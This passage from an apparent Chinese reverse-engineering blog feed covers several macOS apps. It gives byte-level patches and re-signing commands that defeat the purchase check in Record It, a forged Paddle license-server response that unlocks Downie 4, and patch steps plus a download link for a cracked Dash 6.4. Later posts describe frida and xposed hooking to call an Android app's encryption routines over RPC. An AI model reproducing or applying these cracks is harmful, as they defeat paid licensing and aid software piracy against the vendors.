    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="Record-It（ARM-amp-X86）crack"><a href="#Record-It（ARM-amp-X86）crack" class="headerlink" title="Record It（ARM&amp;X86）crack"></a>Record It（ARM&amp;X86）crack</h1><p>项目需要录屏，找了一下商店录屏软件，基本都是下载免费，但完整功能均需要内购。</p><p>下载了Record It，版本1.7.6(2022072000)校验逻辑很简单，就不放过程了，修改“-[IAPWindow didPay]”函数返回值为1即可：</p><p>x86_64:</p><p>0x10005852E    0F BE 04 07 ⇒ 66 B8 01 00</p><p>movsx eax, byte ptr [rdi + rax] ⇒ mov ax, 1</p><p>ARM</p><p>0x10004F650    00 68 68 38 ⇒ 20 00 80 52</p><p>ldrb w0, [x0, x8] ⇒ mov w0, #1</p><p>patch重新签名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xattr -r -d com.apple.quarantine /Applications/Record\ It.app </span><br><span class="line"></span><br><span class="line">codesign -f -s - --deep /Applications/Record\ It.app</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Downie 4(免Patch激活)</title>
    <link href="https://f4ncy.top/2022/12/06/Downie4crack/"/>
    <id>https://f4ncy.top/2022/12/06/Downie4crack/</id>
    <published>2022-12-06T00:50:48.000Z</published>
    <updated>2022-12-06T08:55:26.978Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="Downie-4-免Patch激活"><a href="#Downie-4-免Patch激活" class="headerlink" title="Downie 4(免Patch激活)"></a>Downie 4(免Patch激活)</h1><p><strong>仅供学习用途,如有问题,可通知删除</strong></p><p>照例搜索license、activate等关键词，发现存在如下调用关系：</p><p>Downie4→./Frameworks/Licensing.framework/Versions/A/Licensing→./Frameworks/Paddle.framework/Versions/A/Paddle</p><p>激活是使用的Paddle框架，使用之前破解Slidepad的方法，将</p><p><code>__ZN50Mbo2vpZRt70hoVLvg82RPKlyFkAbc42qmI9cr1Ijdl3az21uFs50zAHVUIXt181HCSHHi4ZdpRtuulbrXCoxOrIjMpLODxEbm3430iEv</code></p><p><code>__ZN50Mbo2vpZRt70hoVLvg82RPKlyFkAbc42qmI9cr1Ijdl3az21uFs50ws2sBh2azITg3jJVgjLkLNxIq37v5veSWtlTYJdNNB1ZIAdzxCEv</code></p><p>两个函数返回值设为1后，运行时发生崩溃。</p><p>转变思路，多个软件都使用Paddle作为激活框架，是否存在通用破解方法。搜索一圈后发现发现这个帖子：</p><p><a href="https://www.chinapyg.com/thread-82491-1-1.html">https://www.chinapyg.com/thread-82491-1-1.html</a></p><p>帖子内容中未介绍破解思路，但是提供了一个切入点，Paddle的文档</p><p><a href="https://developer.paddle.com/reference/5e80fcd84c35b-mac-sdk-setup">https://developer.paddle.com/reference/5e80fcd84c35b-mac-sdk-setup</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Your Paddle SDK Config from the Vendor Dashboard</span></span><br><span class="line">NSString *myPaddleVendorID = @<span class="string">&quot;12345&quot;</span>;</span><br><span class="line">NSString *myPaddleProductID = @<span class="string">&quot;678910&quot;</span>;</span><br><span class="line">NSString *myPaddleAPIKey = @<span class="string">&quot;1234abc5678defg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Default Product Config in case we&#x27;re unable to reach our servers on first run</span></span><br><span class="line">PADProductConfiguration *defaultProductConfig = [[PADProductConfiguration alloc] init];</span><br><span class="line">defaultProductConfig.productName = @<span class="string">&quot;My v4 Product&quot;</span>;</span><br><span class="line">defaultProductConfig.vendorName = @<span class="string">&quot;My Company&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize the SDK singleton with the config</span></span><br><span class="line">Paddle *paddle = [Paddle sharedInstanceWithVendorID:myPaddleVendorID</span><br><span class="line">                                             <span class="attr">apiKey</span>:myPaddleAPIKey</span><br><span class="line">                                          <span class="attr">productID</span>:myPaddleProductID</span><br><span class="line">                                      <span class="attr">configuration</span>:defaultProductConfig</span><br><span class="line">                                           <span class="attr">delegate</span>:nil];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize the Product you&#x27;d like to work with  </span></span><br><span class="line">PADProduct *paddleProduct = [[PADProduct alloc] initWithProductID:myPaddleProductID</span><br><span class="line">                                                      <span class="attr">productType</span>:PADProductTypeSDKProduct</span><br><span class="line">                                                    <span class="attr">configuration</span>:defaultProductConfig];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ask the Product to get its latest state and info from the Paddle Platform</span></span><br></pre></td></tr></table></figure><p>Paddle初始化时需要提供vendorid、productid、apikey。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create the Product we want to work with</span></span><br><span class="line">PADProduct *paddleProduct = [[PADProduct alloc] initWithProductID:@<span class="string">&quot;12345&quot;</span></span><br><span class="line">                                                      <span class="attr">productType</span>:PADProductTypeSDKProduct</span><br><span class="line">                                                    <span class="attr">configuration</span>:nil];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Refresh to ensure we&#x27;ve got up to date information locally for the product</span></span><br><span class="line"><span class="comment">// Remote values will supersede local</span></span><br><span class="line">[paddleProduct refresh:^(NSDictionary * _Nullable productDelta, NSError * _Nullable error) &#123;</span><br><span class="line">    [paddle showProductAccessDialogWithProduct:paddleProduct];</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure><p>仅提供激活窗口调用接口。</p><p>直接抓包分析</p><p><a href="https://v3.paddleapi.com/3.2/license/activate">https://v3.paddleapi.com/3.2/license/activate</a></p><p>请求中包含输入的email和license_key，以及上文提供的Paddle在初始化时使用的vendorid，另外application_identifier和api_key不同软件值不同。</p><p><img src="/2022/12/06/Downie4crack/Untitled.png" alt="Untitled"></p><p>输入错误的license_key，该接口返回错误信息，现在需要一份正确的license返回一个激活成功的应答包报文。正好之前买过一款使用Paddle的其他软件，用那份license_key试一下，拿到如下报文：</p><p><img src="/2022/12/06/Downie4crack/Untitled%201.png" alt="Untitled"></p><p>修改product_id为你想要激活软件的productid，使用以上数据替换<a href="https://v3.paddleapi.com/3.2/license/activate">activate</a>的应答包即可激活。</p><p>激活流程：</p><ul><li>安装Downie 4</li><li>打开激活窗口，输入邮箱和许可证，例如“AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA”</li><li>抓包，将接口<a href="https://v3.paddleapi.com/3.2/license/activate%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E6%9B%BF%E6%8D%A2%E4%B8%BA%E4%BB%A5%E4%B8%8B%E5%86%85%E5%AE%B9">https://v3.paddleapi.com/3.2/license/activate的返回值替换为以下内容</a>  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;success&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;response&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;activation_id&quot;</span>: <span class="string">&quot;4570000&quot;</span>,<span class="comment">//随意</span></span><br><span class="line">        <span class="attr">&quot;user_id&quot;</span>: <span class="string">&quot;49430000&quot;</span>,<span class="comment">//随意</span></span><br><span class="line">        <span class="attr">&quot;expires&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;expiry_date&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">&quot;product_id&quot;</span>: <span class="string">&quot;583749&quot;</span>,<span class="comment">//产品id确定</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;activation_license&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;allowed_uses&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;times_used&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Dash 6.4(ARM&amp;X86) crack</title>
    <link href="https://f4ncy.top/2022/11/21/dash_crack/"/>
    <id>https://f4ncy.top/2022/11/21/dash_crack/</id>
    <published>2022-11-20T19:09:44.000Z</published>
    <updated>2023-01-06T06:19:39.826Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="Dash-6-4-ARM-amp-X86-crack"><a href="#Dash-6-4-ARM-amp-X86-crack" class="headerlink" title="Dash 6.4(ARM&amp;X86) crack"></a>Dash 6.4(ARM&amp;X86) crack</h1><h3 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h3><p>运行后会提示试用天数剩余，试用期为30天。</p><p>Setting中的License中可以选择打开license file激活，选择非法license file，提示“Invalid License”。</p><p>我们从license file入手。</p><p>搜索关键词License、open、file、activate、Invalid License等。</p><p>获取到关键函数：-[DHInApp processLicenseFile:]</p><p><img src="/2022/11/21/dash_crack/Untitled.png" alt="Untitled"></p><p>以 ’sub_100085ED4((__int64)v5, v6) == (void *)26’作为判断条件</p><p>sub_100085ed4函数获取全局变量qword_100344998字符串长度，若不为0则返回该字符串长度，如为0并且全局变量qword_100344990字符串不为“fail”，则解析打开的license file，但是对内容紧紧是比较判断，并没有进行任何运算。</p><p><img src="/2022/11/21/dash_crack/Untitled%201.png" alt="Untitled"></p><p>最终，版本≥6后，将全局变量qword_100344998赋值为”com.barebones.textwrangler”，并返回字符串长度，我们发现正好是26。</p><p><img src="/2022/11/21/dash_crack/Untitled%202.png" alt="Untitled"></p><p>查看对sub_100085ed4函数的引用，基本都是判断结果是否为26，这里想法就是将sub_100085ed4函数永远返回26。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">objc_msgSend_sharedInApp(&amp;OBJC_CLASS___DHInApp, a2);</span><br><span class="line"><span class="keyword">if</span> ( objc_msgSend_length((<span class="keyword">void</span> *)qword_100344998, v2) )</span><br><span class="line">    <span class="keyword">return</span> objc_msgSend_length((<span class="keyword">void</span> *)qword_100344998, v3);</span><br><span class="line"></span><br><span class="line">__text:0000000100085EF0                 ADRP            X21, #classRef_DHInApp@PAGE</span><br><span class="line"><span class="attr">__text</span>:0000000100085EF4                 LDR             X0, [X21,#classRef_DHInApp@PAGEOFF]</span><br><span class="line"><span class="attr">__text</span>:0000000100085EF8                 BL              _objc_msgSend$sharedInApp</span><br><span class="line"><span class="attr">__text</span>:0000000100085EFC                 ADRP            X23, #qword_100344998@PAGE</span><br><span class="line"><span class="attr">__text</span>:0000000100085F00                 LDR             X0, [X23,#qword_100344998@PAGEOFF]</span><br><span class="line"><span class="attr">__text</span>:0000000100085F04                 BL              _objc_msgSend$length</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qword_100344998 = objc_retain(CFSTR(<span class="string">&quot;com.barebones.textwrangler&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> ( objc_msgSend_length((<span class="keyword">void</span> *)qword_100344998, v2) )</span><br><span class="line">    <span class="keyword">return</span> objc_msgSend_length((<span class="keyword">void</span> *)qword_100344998, v3);</span><br><span class="line"></span><br><span class="line">__text:0000000100085EF0                 ADRP            X23, #qword_100344998@PAGE</span><br><span class="line"><span class="attr">__text</span>:0000000100085EF4                 ADRL            X0, cfstr_ComBarebonesTe ; id</span><br><span class="line"><span class="attr">__text</span>:0000000100085EFC                 BL              _objc_retain</span><br><span class="line"><span class="attr">__text</span>:0000000100085F00                 STR             X0, [X23,#qword_100344998@PAGEOFF]</span><br><span class="line"><span class="attr">__text</span>:0000000100085F04                 BL              _objc_msgSend$length</span><br></pre></td></tr></table></figure><p>ADRL指令：</p><p>__text:0000000100085EF4  ADRL X0, cfstr_ComBarebonesTe ; id</p><p>转换为：</p><p>__text:0000000100085EF4  ADRP x23,#0x238000</p><p>__text:0000000100085EF8  add x0, x0, #0x1a8</p><p>将pc低12位清零，加上12位清零的偏移量，再加上目标地址的低12位得到目标地址。</p><h3 id="X86-64"><a href="#X86-64" class="headerlink" title="X86_64"></a>X86_64</h3><p>思路相同</p><p>patch指令如下：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+[DHInApp sharedInApp](&amp;OBJC_CLASS___DHInApp, <span class="string">&quot;sharedInApp&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( objc_msgSend(qword_1003B6F08, <span class="string">&quot;length&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> objc_msgSend(qword_1003B6F08, <span class="string">&quot;length&quot;</span>);</span><br><span class="line">__text:00000001000BAB9A                 mov     rdi, <span class="attr">cs</span>:classRef_DHInApp ; id</span><br><span class="line"><span class="attr">__text</span>:00000001000BABA1                 mov     r13, <span class="attr">cs</span>:selRef_sharedInApp</span><br><span class="line"><span class="attr">__text</span>:00000001000BABA8                 mov     r14, <span class="attr">cs</span>:_objc_msgSend_ptr</span><br><span class="line"><span class="attr">__text</span>:00000001000BABAF                 mov     rsi, r13        ; SEL</span><br><span class="line"><span class="attr">__text</span>:00000001000BABB2                 call    r14 ; _objc_msgSend</span><br><span class="line"><span class="attr">__text</span>:00000001000BABB5                 mov     rdi, <span class="attr">cs</span>:qword_1003B6F08 ; id</span><br><span class="line"><span class="attr">__text</span>:00000001000BABBC                 mov     r15, <span class="attr">cs</span>:selRef_length</span><br><span class="line"><span class="attr">__text</span>:00000001000BABC3                 mov     rsi, r15        ; SEL</span><br><span class="line"><span class="attr">__text</span>:00000001000BABC6                 call    r14 ; _objc_msgSend</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qword_1003B6F08 = objc_retain(CFSTR(<span class="string">&quot;com.barebones.textwrangler&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> ( objc_msgSend(qword_1003B6F08, <span class="string">&quot;length&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> objc_msgSend(qword_1003B6F08, <span class="string">&quot;length&quot;</span>);</span><br><span class="line">__text:00000001000BAB9A                 lea     rdi, cfstr_ComBarebonesTe ; id</span><br><span class="line"><span class="attr">__text</span>:00000001000BABA1                 call    cs:_objc_retain_ptr</span><br><span class="line"><span class="attr">__text</span>:00000001000BABA7                 mov     cs:qword_1003B6F08, rax</span><br><span class="line"><span class="attr">__text</span>:00000001000BABAE                 mov     r14, <span class="attr">cs</span>:_objc_msgSend_ptr</span><br><span class="line"><span class="attr">__text</span>:00000001000BABB5                 mov     rdi, <span class="attr">cs</span>:qword_1003B6F08 ; id</span><br><span class="line"><span class="attr">__text</span>:00000001000BABBC                 mov     r15, <span class="attr">cs</span>:selRef_length</span><br><span class="line"><span class="attr">__text</span>:00000001000BABC3                 mov     rsi, r15        ; SEL</span><br><span class="line"><span class="attr">__text</span>:00000001000BABC6                 call    r14 ; _objc_msgSend</span><br></pre></td></tr></table></figure><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://www.aliyundrive.com/s/72KoDAR9f8f">https://www.aliyundrive.com/s/72KoDAR9f8f</a></p><p>提取码：4c4i</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>代码重用之可执行环境模拟</title>
    <link href="https://f4ncy.top/2022/05/29/CodeReuse2/"/>
    <id>https://f4ncy.top/2022/05/29/CodeReuse2/</id>
    <published>2022-05-29T12:50:44.000Z</published>
    <updated>2022-06-04T15:00:43.873Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="代码重用之可执行环境模拟"><a href="#代码重用之可执行环境模拟" class="headerlink" title="代码重用之可执行环境模拟"></a>代码重用之可执行环境模拟</h1><p>一段python代码，可能只需要复制粘贴，安装依赖库就可以运行，可以在任何支持python运行的操作系统中运行；</p><p>一个ELF文件，需要对应的操作系统、指令架构平台、依赖库才能运行；</p><p>脚本语言运行时依赖虚拟机，照搬到PE文件或ELF文件，当然现在有VMare、PD等虚拟机，一个脚本语言的解释器安装很方便，但是要一个可执行文件的运行环境安装一个虚拟机软件和一个完整的操作系统，过于臃肿、大材小用了，是否有一种类似与解释器的方式来解释执行一个可执行文件呢？或者一个更轻量的虚拟机呢？</p><p>指令集模拟器</p><p>不依赖真实芯片、可以白盒地观察和获取模拟器的任意状态</p><p>解释型模拟器（Spike）</p><p>翻译型模拟器（QEMU）</p><p>全功能模拟环境</p><p>最小化功能模拟环境</p><p>沙箱环境</p><p>iot会需要单一操作系统（Linux），多指令架构平台（arm、arm64、mips、x86）的仿真，</p><p>Android runtime仿真：</p><p><a href="https://bbs.pediy.com/thread-272605.htm">https://bbs.pediy.com/thread-272605.htm</a></p><h2 id="unidbg"><a href="#unidbg" class="headerlink" title="unidbg"></a>unidbg</h2><p><a href="https://github.com/zhkl0228/unidbg">https://github.com/zhkl0228/unidbg</a></p><h2 id="qiling"><a href="#qiling" class="headerlink" title="qiling"></a>qiling</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>代码重用及RPC思路</title>
    <link href="https://f4ncy.top/2022/05/29/CodeReuse1/"/>
    <id>https://f4ncy.top/2022/05/29/CodeReuse1/</id>
    <published>2022-05-29T12:32:55.000Z</published>
    <updated>2022-05-29T12:46:00.450Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="代码重用及RPC思路"><a href="#代码重用及RPC思路" class="headerlink" title="代码重用及RPC思路"></a>代码重用及RPC思路</h1><p>这里讨论的代码重用算是狭义意义上的黑盒或灰盒代码重用，如对编译后文件中具体的一个函数、一个类进行利用，这里涉及两种情况：</p><ol><li>可以分离出目标代码所在文件的，在不加固情况下可以拿到dex或so文件的，在加固情况下通过脱壳可以还原出目标代码，且目标代码依赖类也被还原出来；</li><li>无法分离出目标代码的，一般就是加固应用。</li></ol><p>对于第一种情况，最理想的情况就是通过直接扣出代码进行重用，但是对于代码量过大或反编译效果不太理想的情况，就需要在运行时进行重用，思路是自己写app加载dex或so进行反射调用；<br>对于第二种情况，只能在运行时重用，且无法剥离原应用，只能通过hook解决，这里重点介绍xposed和frida两种工具的操作方式：</p><h2 id="frida"><a href="#frida" class="headerlink" title="frida"></a>frida</h2><p> 代码重用主要解决的是获取到方法所在类的实例，利用实例进行方法调用，需要实例的方式有：</p><ol><li>通过Java.use(‘xxx’).method.implementation实现对具体方法hook时获取this对象来保存目标对象实例，尚不清楚Java.retain(this)和直接获取this有啥区别；</li><li>通过Java.choose来搜索当前堆中已有的目标类对象实例再对其保存；</li><li>对于构造函数参数简单的类可以通过调用&amp;new创建一个实例。</li></ol><p>之前帮一位大佬搞一个app的时候因为需要将app的方法rpc，吹一波大佬写的burp插件：<a href="https://github.com/mr-m0nst3r/Burpy">https://github.com/mr-m0nst3r/Burpy</a></p><p> rpc：<br> 用大佬的方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exported</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">rpc.exports = &#123;</span><br><span class="line"><span class="attr">Decrypt</span>: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Calling Decrypt function:&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> res = <span class="literal">null</span>;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">res = sm4Instance.g(key, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;key&quot;</span>, key, <span class="string">&quot;data&quot;</span>, data);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;dec res:&quot;</span>, res);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> res ? res : <span class="string">&quot;failed to decrypt&quot;</span>;</span><br><span class="line">&#125;,</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Burpy</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">self.rpc = self._load_rpc()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_load_rpc</span>(<span class="params">self</span>):</span></span><br><span class="line">source = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> codecs.<span class="built_in">open</span>(<span class="string">r&quot;hook.js&quot;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">      source = f.read()</span><br><span class="line">    script = self.session.create_script(source)</span><br><span class="line">    script.load()</span><br><span class="line">    <span class="keyword">return</span> script.exports</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self,header,body</span>):</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;decrypting&quot;</span>)</span><br><span class="line">ret0 = self.rpc.decres(url, body)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;decry result:&quot;</span>, ret0)</span><br><span class="line"><span class="keyword">return</span> header, ret0</span><br></pre></td></tr></table></figure><p> 本机与注入进程间的通讯是使用frida提供的rpc.exports，burp与本地python进程间的通讯大佬用的是pyro。</p><h2 id="xposed"><a href="#xposed" class="headerlink" title="xposed"></a>xposed</h2><p> xposed的重用方式与frida总体类似：</p><ol><li>通过XposedHelpers.findAndHookMethod(…)在对具体方法hook时获取methodHookParam.this对象来保存目标对象实例；</li><li>通过分析代码寻找赋值为目标类实例对象的类成员变量来反射获取；</li><li>对于构造函数参数简单的类可以通过调用newInstance创建一个实例。</li></ol><p>rpc:</p><p> 这里介绍一种使用广播进行rpc的方法，注册一个调用目标函数的广播后，通过adb命令触发这个广播来实现rpc，所以本机和App进程通讯是通过终端io，这并不理想，如果后续找到更好的通讯方式再做分享。<br> 首先我们写一个广播，包括接收参数，参数处理，并调用目标函数。动态注册该广播：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyReiceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">      String msg_b64=intent.getStringExtra(<span class="string">&quot;msg&quot;</span>);</span><br><span class="line">      String type=intent.getStringExtra(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">      String url=intent.getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">      Class CryptoUtil= XposedHelpers.findClass(<span class="string">&quot;com.xxx.EncryptUtils.SM4&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">      Class&lt;?&gt; PEJniLib = XposedHelpers.findClass(<span class="string">&quot;com.xxx.EncryptUtils.PEJniLib&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">      <span class="comment">//target func is static</span></span><br><span class="line">      <span class="keyword">if</span>(type.equals(<span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        String msg = <span class="keyword">new</span> String(Base64.decode(msg_b64.getBytes(), Base64.DEFAULT));</span><br><span class="line">        String result=(String)XposedHelpers.callStaticMethod(CryptoUtil,<span class="string">&quot;h&quot;</span>,msg,key);</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;invoke SM4encrypt:&quot;</span>+result);</span><br><span class="line">      &#125;<span class="keyword">else</span> <span class="keyword">if</span>(type.equals(<span class="string">&quot;1&quot;</span>))&#123;<span class="comment">//target func is direct</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object PEJniLib_=PEJniLib.newInstance();</span><br><span class="line">            String result = (String) XposedHelpers.callMethod(PEJniLib_, <span class="string">&quot;a&quot;</span>, msg, key);</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;invoke getNativeValue:&quot;</span> + result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> 